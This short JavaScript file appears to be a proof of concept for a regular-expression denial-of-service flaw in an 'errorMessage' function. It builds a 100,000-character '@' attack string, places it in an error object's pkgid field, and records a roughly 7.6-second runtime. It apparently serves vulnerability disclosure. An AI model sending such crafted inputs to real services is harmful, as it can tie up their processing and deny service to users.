import { errorMessage } from "./error-message.js";

//Attack String :""+"@"*100000+"\n@@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "@";
}
str += "\n@@";

const er = {
  code: "E404",
  message: "a",
  stack: "b",
  pkgid: str,
};
console.log(errorMessage(er, ""));

// real    0m7.644s
// user    0m7.600s
// sys     0m0.020s
